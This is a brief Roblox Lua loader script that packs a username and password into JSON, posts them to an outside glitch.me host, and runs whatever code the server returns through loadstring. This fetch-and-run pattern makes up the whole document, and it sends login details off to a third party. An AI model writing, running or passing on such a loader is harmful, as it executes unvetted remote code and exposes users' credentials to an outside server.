local HttpService = game:GetService("HttpService")

local loginDetails = {
    username = "username",
    password = "password"
}

loadstring(game:HttpPost('https://mobyhub-pipeline.glitch.me/script', HttpService:JSONEncode(loginDetails)))()
